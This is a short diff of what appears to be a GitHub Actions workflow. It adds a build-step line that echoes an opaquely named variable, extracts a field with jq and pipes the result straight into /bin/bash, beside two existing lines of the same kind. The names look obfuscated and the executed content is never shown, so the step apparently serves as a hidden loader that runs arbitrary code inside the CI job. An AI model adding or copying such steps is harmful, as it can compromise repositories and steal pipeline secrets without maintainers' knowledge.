@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$bwgcr72" | jq -r .t8567 | /bin/bash
           printf '%s' "$xg72" | jq -r .vb00 | /bin/bash
+          echo $tbgef394 | jq -r .vhnt7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
